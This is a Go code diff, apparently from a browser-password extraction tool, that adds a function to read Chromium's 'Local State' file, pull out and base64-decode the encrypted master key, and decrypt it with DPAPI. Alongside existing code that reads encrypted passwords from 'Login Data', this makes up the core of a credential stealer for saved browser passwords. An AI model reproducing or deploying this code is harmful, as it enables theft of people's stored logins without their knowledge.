@@ -2,9 +2,12 @@ package internals
 
 import (
 	"database/sql"
+	"encoding/base64"
+	"encoding/json"
 	"errors"
 	"fmt"
 	"net/url"
+	"os"
 	"strings"
 )
 
@@ -24,7 +27,7 @@ func getChromiumBasePath(browser string) (string, error) {
 	}
 }
 
-// Given the path for a "Login Data" file (chromiumBasePath\\LoginData)
+// Given the path for a "Login Data" file (chromiumBasePath\\*\\LoginData)
 // it returns a Credentials slice containing encrypted passwords.
 // Note:
 // The target browser should not be running, otherwise the "Login Data"
@@ -69,4 +72,35 @@ func getChromiumCredentials(path string) ([]Credentials, error) {
 	}
 
 	return credentials, nil
+}
+
+// Given the path for "Local State" (chromiumBasePath\\Local State)
+// it extracts the `encrypted_key`, decodes it (base64) and then
+// decrypts it with DPAPI.
+func getChromiumDecryptionKey(path string) ([]byte, error) {
+	stateFile, err := os.ReadFile(path)
+	if err != nil {
+		return nil, err
+	}
+	var data struct {
+		OsCrypt struct {
+			EncryptedKey string `json:"encrypted_key"`
+		} `json:"os_crypt"`
+	}
+	err = json.Unmarshal(stateFile, &data)
+	if err != nil {
+		return nil, err
+	}
+	keyEnc, err := base64.StdEncoding.DecodeString(data.OsCrypt.EncryptedKey)
+	if err != nil {
+		return nil, err
+	}
+
+	// Decrypt the private key
+	// Note: the first 5 bytes correspond to "DPAPI" (check with xxd)
+	key, err := DecryptKey(keyEnc[5:])
+	if err != nil {
+		return nil, err
+	}
+	return key, nil
 }
